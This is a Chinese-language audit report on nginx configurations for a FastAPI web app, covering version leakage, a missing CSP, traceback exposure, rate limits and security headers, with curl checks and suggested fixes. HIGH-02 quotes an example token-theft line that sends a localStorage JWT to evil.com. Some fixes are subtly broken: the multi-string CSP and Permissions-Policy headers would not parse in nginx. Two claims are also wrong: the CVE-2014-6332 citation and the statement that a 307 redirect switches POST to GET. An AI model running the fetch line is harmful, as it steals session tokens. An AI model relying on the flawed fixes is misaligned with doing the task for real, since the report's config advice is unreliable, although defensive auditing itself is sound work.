# Nginx 安全审计报告

**审计对象:** `infra/nginx/nginx.local.conf` (本地开发) + `infra/nginx/nginx.conf` (Docker)
**nginx 版本:** 1.30.3
**审计日期:** 2026-07-02
**范围:** nginx 配置层面安全问题，不涉及后端应用逻辑

---

## 问题总览

| 等级 | 数量 | 关键项 |
|------|------|--------|
| 🟠 High | 3 | 版本泄露 / 无 CSP / traceback 穿透 |
| 🟡 Medium | 5 | 限流偏弱 / Host 头未校验 / 缺少现代安全头 / 307 泄露 / SPA 全 200 |
| 🔵 Low | 5 | XSS-Protection 过时 / 无 limit_except / 缺少 body 限制 / X-Forwarded-Host / 静态文件暴露 |

---

## 🟠 HIGH-01: nginx 版本号泄露

**文件:** 默认行为（`server_tokens on`），两个配置文件均未显式关闭

**验证:**
```bash
curl -sI http://localhost:8080/ | grep Server
# Server: nginx/1.30.3
```

**影响:** 攻击者可精确定位 nginx 版本，利用已知 CVE。nginx 1.30.x 目前无严重 RCE CVE，但信息泄露降低了攻击门槛。

**修复:**
```nginx
# 在 http 块中添加
server_tokens off;
```

---

## 🟠 HIGH-02: 缺少 Content-Security-Policy 响应头

**文件:** `nginx.local.conf:90-94` / `nginx.conf:57-61` — 两个配置均有安全头但缺失 CSP

**当前安全头列表:**
```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header X-Permitted-Cross-Domain-Policies "none" always;
# ❌ 缺少 Content-Security-Policy
```

**为什么这是 High:** 前端将 JWT 存储在 `localStorage`。没有 CSP，任何 XSS 漏洞都可直接读取 token：
```javascript
fetch('https://evil.com/steal?t=' + localStorage.getItem('dwg_access_token'))
```

**修复:**
```nginx
add_header Content-Security-Policy "default-src 'self'; "
    "script-src 'self' 'unsafe-inline'; "
    "style-src 'self' 'unsafe-inline'; "
    "connect-src 'self' http://localhost:*; "
    "img-src 'self' data: blob:; "
    "font-src 'self'; "
    "frame-ancestors 'self'" always;
```

---

## 🟠 HIGH-03: `proxy_intercept_errors off` 导致后端 traceback 穿透

**文件:** `nginx.local.conf:111` — `proxy_intercept_errors off;`

**描述:** 此设置让 nginx 不对后端错误响应做任何处理，直接将 FastAPI 的 500 traceback 传递给客户端。配合后端 `debug=true`，每次异常都泄露完整 Python 调用栈（文件路径、版本、中间件链）。

**验证:**
```bash
# 触发后端异常，traceback 直接穿透 nginx
curl -X POST http://localhost:8080/api/v1/auth/sessions \
  -H "Content-Type: text/plain" -d '{}'
# → 500 + 完整 Python traceback
```

**修复（二选一）:**
```nginx
# 方案 A: 开启错误拦截（nginx 返回统一错误页）
proxy_intercept_errors on;
error_page 500 502 503 504 /50x.html;

# 方案 B: 保持 off 但确保后端 debug=false
# (推荐先修后端，nginx 保留 off 让 FastAPI 自定义错误处理器正常工作)
```

**建议:** 组合修复 — 后端 `DEBUG=false` + nginx 添加 `error_page` 作为兜底防御层。

---

## 🟡 MEDIUM-01: 登录限流过于宽松

**文件:** `nginx.local.conf:79,98` / `nginx.conf:46,65`

```nginx
limit_req_zone $binary_remote_addr zone=login:10m rate=10r/s;
# ...
location = /api/v1/auth/sessions {
    limit_req zone=login burst=5 nodelay;
```

**分析:** 10 req/s + burst 5 意味着单个 IP 可以瞬间发送 5 个请求，然后稳定 10 req/s。对于密码爆破来说，这等于每 6 秒可尝试 60 个密码，每分钟 600 个，每小时 36,000 个——足以遍历常见密码字典。

**实际攻击验证 (Round 2):** 虽然 nginx 层有 10r/s 限制，但后端 uvicorn 直接监听在可访问地址，攻击者可以直接连 8000 端口完全绕过限流。

**修复:**
```nginx
# 收紧登录限流
limit_req_zone $binary_remote_addr zone=login:10m rate=2r/s;  # 降到 2 req/s

location = /api/v1/auth/sessions {
    limit_req zone=login burst=3 nodelay;  # burst 降到 3
    # 配合: 连续失败 5 次后临时 ban IP (需 fail2ban 或 nginx auth_request)
}
```

---

## 🟡 MEDIUM-02: Host 头未校验

**文件:** `nginx.local.conf:85` / `nginx.conf:54`

```nginx
server {
    listen 8080;
    server_name dwg-agent.company.local localhost;
```

**`server_name` 仅在多 server 块时用于路由选择，不对 `Host` 头做校验。** 任意 Host 头的请求都被接受。

**验证:**
```bash
curl -H "Host: evil.com" http://localhost:8080/health
# → 200 OK（正常响应）
```

**影响:**
- 缓存投毒（若引入 CDN）
- Host 头注入攻击（若后端使用 `$host` 变量生成链接）
- 密码重置邮件投毒（未来功能）

**修复:**
```nginx
# 在 server 块中添加无效 Host 的拦截
if ($host !~* ^(localhost|dwg-agent\.company\.local|127\.0\.0\.1)$ ) {
    return 444;  # nginx 特殊状态码：直接关闭连接
}
```

---

## 🟡 MEDIUM-03: 缺少现代安全响应头

**缺失的头:**

| 头 | 用途 | 优先级 |
|----|------|--------|
| `Permissions-Policy` | 限制浏览器 API（摄像头、麦克风、定位等） | 中 |
| `Cross-Origin-Opener-Policy` | 防止跨域窗口交互（Spectre 缓解） | 中 |
| `Cross-Origin-Resource-Policy` | 控制资源跨域加载 | 低 |
| `Strict-Transport-Security` | 强制 HTTPS（阶段 C 需要） | 高(C 阶段) |

**`Permissions-Policy` 示例:**
```nginx
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), "
    "interest-cohort=(), payment=(), usb=(), bluetooth=()" always;
```

**`Cross-Origin-Opener-Policy`:**
```nginx
add_header Cross-Origin-Opener-Policy "same-origin" always;
```

**注意:** 这些头添加后需在前端开发中验证是否影响功能（如 COOP 可能影响 OAuth 弹窗）。

---

## 🟡 MEDIUM-04: POST 路径尾部斜杠导致 307 重定向

**验证:**
```bash
curl -X POST http://localhost:8080/api/v1/auth/sessions/ -d '{}' -H "Content-Type: application/json" -v
# → 307 Temporary Redirect → GET /api/v1/auth/sessions (丢失 POST body)
```

**描述:** nginx 对 `/api/v1/auth/sessions/` (带尾部斜杠) 返回 307 重定向到 `/api/v1/auth/sessions`。虽然 FastAPI 后端通常处理这个，但 nginx 层面的重定向可能导致 POST body 丢失（取决于客户端行为）。

**影响:** 如果某些 HTTP 客户端在 307 时不重新发送 POST body，会导致认证失败。更关键的是，这可能被利用做请求走私。

**修复:**
```nginx
# 在 location = /api/v1/auth/sessions 前添加精确匹配的重定向
location = /api/v1/auth/sessions/ {
    return 301 /api/v1/auth/sessions;
}
```

---

## 🟡 MEDIUM-05: SPA catch-all 使敏感路径返回 200

**文件:** `nginx.local.conf:157-161` / `nginx.conf:121-124`

```nginx
location / {
    try_files $uri $uri/ /index.html;  # 所有不匹配路径 → index.html + 200
}
```

**验证:**
```bash
curl -o /dev/null -w "%{http_code}" http://localhost:8080/admin          # 200
curl -o /dev/null -w "%{http_code}" http://localhost:8080/config         # 200
curl -o /dev/null -w "%{http_code}" http://localhost:8080/actuator/env   # 200
curl -o /dev/null -w "%{http_code}" http://localhost:8080/phpMyAdmin     # 200
```

**唯一拦截的是 `~ /\.` 规则（隐藏文件，如 `/.env` → 403）。** 但 `/admin`、`/config`、`/backup` 等常见敏感路径都返回 200。

**影响:**
- 混淆自动化扫描器（大量误报 200 → 攻击者可能忽略真正的漏洞）
- 前端路由不存在时无反馈
- 若未来添加真正的 `/admin` 后端路由，当前行为会掩盖它

**修复:**
```nginx
# 对已知敏感路径显示拒绝（在 location / 之前添加）
location ~ ^/(admin|config|backup|console|actuator|phpMyAdmin|druid|manager) {
    return 404;
}
```

---

## 🔵 LOW-01: `X-XSS-Protection` 已过时且有潜在危害

**文件:** `nginx.local.conf:92` / `nginx.conf:59`

```nginx
add_header X-XSS-Protection "1; mode=block" always;
```

**问题:** 此头在所有主流浏览器中已弃用。`mode=block` 在某些旧版浏览器中会激活 XSS 过滤器，该过滤器自身曾被发现存在绕过漏洞 (CVE-2014-6332 等)。现代浏览器忽略此头，但它在响应中占用字节。

**修复:**
```nginx
# 直接删除此行。现代浏览器依赖 CSP 的 script-src 防御 XSS。
# add_header X-XSS-Protection "1; mode=block" always;   ← 删除
```

---

## 🔵 LOW-02: 静态文件 location 无 `limit_except` 方法限制

**文件:** `nginx.local.conf:157-171` / `nginx.conf:121-134`

```nginx
location / {
    try_files $uri $uri/ /index.html;
    # 无 limit_except → 接受任意 HTTP 方法
}
```

**描述:** 静态文件目录接受 POST/PUT/DELETE 等非只读方法（虽然 `try_files` 不会写入，但缺少显式限制）。

**修复:**
```nginx
location / {
    limit_except GET HEAD OPTIONS {
        deny all;
    }
    try_files $uri $uri/ /index.html;
    # ...
}
```

---

## 🔵 LOW-03: 缺少 URI 级别的 body size 限制

**文件:** 两个配置文件均只有全局 `client_max_body_size 512m;`

**描述:** 登录接口 (`/api/v1/auth/sessions`) 接受 512MB 的 POST body，远超业务需要（用户名+密码 < 1KB）。大 body 攻击可消耗服务器内存。

**修复:**
```nginx
location = /api/v1/auth/sessions {
    client_max_body_size 1k;  # 登录只需不到 1KB
    limit_req zone=login burst=5 nodelay;
    # ...
}

location /api/ {
    client_max_body_size 512m;  # 文件上传需要大 body
    # ...
}
```

---

## 🔵 LOW-04: 缺少 `proxy_set_header X-Forwarded-Host`

**文件:** 两个配置文件的所有 `proxy_set_header` 块

```nginx
proxy_set_header Host $host;              # ✅ 有
proxy_set_header X-Real-IP $remote_addr;  # ✅ 有
proxy_set_header X-Forwarded-For ...;     # ✅ 有
proxy_set_header X-Forwarded-Proto ...;   # ✅ 有
# proxy_set_header X-Forwarded-Host ...;  # ❌ 缺失
```

**影响:** 后端无法正确重建原始请求 URL（如果应用需要生成绝对 URL 会用到）。

**修复:**
```nginx
proxy_set_header X-Forwarded-Host $host;
```

---

## 🔵 LOW-05: `frontend/dist` 静态文件配置差异

**`nginx.local.conf:158-171`:**
```nginx
location / {
    root /home/Creeken/.../frontend/dist;  # 硬编码路径
    ...
}
```

**问题:** 本地开发配置含硬编码绝对路径（注释已说明原因），但 `dist/` 目录不存在时 nginx 仍能启动，导致 SPA 返回空白页无任何错误提示。

**建议:** 启动脚本 (`scripts/start-dev.sh`) 中增加 dist/ 存在性检查，不存在时自动 `npm run build`。

---

## 配置对比: nginx.local.conf vs nginx.conf (Docker)

| 配置项 | nginx.local.conf | nginx.conf | 问题 |
|--------|-----------------|------------|------|
| 监听端口 | 8080 | 80 | — |
| upstream | `127.0.0.1:8000` | `backend-api:8000` | — |
| `use epoll` | ✅ | ❌ | Docker 缺少 epoll（Linux 下性能优化） |
| `tcp_nodelay` | ✅ | ❌ | Docker 缺少（小包延迟优化） |
| `types_hash_max_size` | ✅ | ❌ | Docker 缺少（MIME type 解析优化） |
| `proxy_intercept_errors` | `off` (显式) | 默认 (off) | 一致 |
| 硬编码路径 |是（注释说明了原因）| 否 | 设计如此 |
| SSL | 否 | 否 | 双方均无（等阶段 C） |

**注意:** `nginx.conf` (Docker 版) 缺少三项性能优化配置，建议从 `nginx.local.conf` 中同步过去。

---

## 修复优先级

```
[P1 - 24h]  HIGH-01    server_tokens off
[P1 - 24h]  HIGH-02    添加 Content-Security-Policy
[P1 - 24h]  HIGH-03    proxy_intercept_errors + error_page 兜底
[P2 - 1周]  MEDIUM-01  收紧登录限流 (2r/s)
[P2 - 1周]  MEDIUM-02  Host 头白名单校验
[P2 - 1周]  MEDIUM-04  POST 尾部斜杠显式重定向
[P2 - 1周]  MEDIUM-05  SPA 敏感路径显式 404
[P3 - 2周]  MEDIUM-03  添加 Permissions-Policy / COOP
[P3 - 2周]  LOW-01~05  次要改进
```

---

## 完整的推荐安全头配置

```nginx
# 在 server 块中（替换现有安全头配置）

# 基础安全头
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header X-Permitted-Cross-Domain-Policies "none" always;

# 现代安全头（新增）
add_header Content-Security-Policy "default-src 'self'; "
    "script-src 'self' 'unsafe-inline'; "
    "style-src 'self' 'unsafe-inline'; "
    "connect-src 'self' http://localhost:*; "
    "img-src 'self' data: blob:; "
    "font-src 'self'; "
    "frame-ancestors 'self'" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), "
    "interest-cohort=(), payment=(), usb=(), bluetooth=()" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;

# 隐藏 nginx 版本（在 http 块中）
server_tokens off;
```
